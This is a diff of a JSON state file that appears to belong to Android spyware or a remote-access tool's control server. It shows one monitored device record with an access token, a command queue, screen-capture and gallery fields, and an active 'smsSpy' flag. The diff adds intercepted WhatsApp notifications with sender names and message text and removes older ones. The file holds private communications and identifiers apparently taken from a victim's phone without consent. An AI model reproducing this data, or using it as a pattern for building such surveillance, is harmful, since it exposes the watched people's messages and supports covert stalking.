@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927596330,
+    "lastSeen": 1775927599251,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "~ Rusjie: wah rame",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927599888
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ Rusjie",
+        "content": "wah rame",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927598882
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927598874
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋",
@@ -4099,30 +4123,6 @@
         "time": "11/04 23:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1775924825698
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎9 pesan baru",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924825695
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎8 pesan baru",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924822837
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (8 pesan): ~ rzqii",
-        "content": "cepirit",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924822798
       }
     ],
     "galleryPhotos": [],
